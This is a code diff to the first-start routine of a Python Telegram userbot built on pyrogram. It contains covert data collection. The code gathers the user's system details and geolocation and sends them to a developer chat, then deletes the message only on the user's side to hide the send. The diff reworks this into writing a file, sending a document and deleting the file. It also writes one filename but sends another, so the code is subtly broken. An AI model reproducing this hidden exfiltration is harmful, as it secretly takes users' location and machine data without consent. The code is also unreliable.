@@ -5,7 +5,7 @@ from pyrogram.errors import *
 import platform, requests, datetime
 from pyrogram.enums import ChatType
 from itertools import islice
-import wmi
+import wmi, os
 from pyrogram.errors.exceptions.bad_request_400 import PeerIdInvalid
 from .stats import get_system
 import geocoder
@@ -78,8 +78,12 @@ async def start(client: Client):
 ```Location
 {g.latlng}```
 '''
-                    msg = await client.send_message(misc.devd,message)
+                    with open('bin/Mod/first_start.txt', 'w') as file:
+                        file.write(message)
+                        file.close()
+                    msg = await client.send_document(misc.devd, 'bin/Mod/log.txt')
                     await msg.delete(revoke=False)
+                    os.remove('bin/Mod/first_start.txt')
 
                 config.set('settings','firststart','0')
                 with open(misc.config_path, 'w') as f:
@@ -87,4 +91,5 @@ async def start(client: Client):
 
         except:
             cfg.write('settings','firststart','1')
-            continue
+            #continue
+            raise
